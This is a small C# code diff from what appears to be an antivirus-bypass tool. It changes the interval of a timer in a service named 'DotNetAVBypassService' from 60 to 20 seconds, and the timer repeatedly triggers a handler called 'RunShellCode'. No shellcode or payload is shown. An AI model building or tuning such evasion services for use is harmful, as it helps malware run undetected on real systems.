@@ -76,7 +76,7 @@ namespace Wrapper
             ServiceName = "DotNetAVBypassService";
             _timer = new Timer
                          {
-                             Interval = 60000 // 60 seconds
+                             Interval = 20000 // 20 seconds
                          };
             _timer.Elapsed += RunShellCode;
             _timer.AutoReset = true;
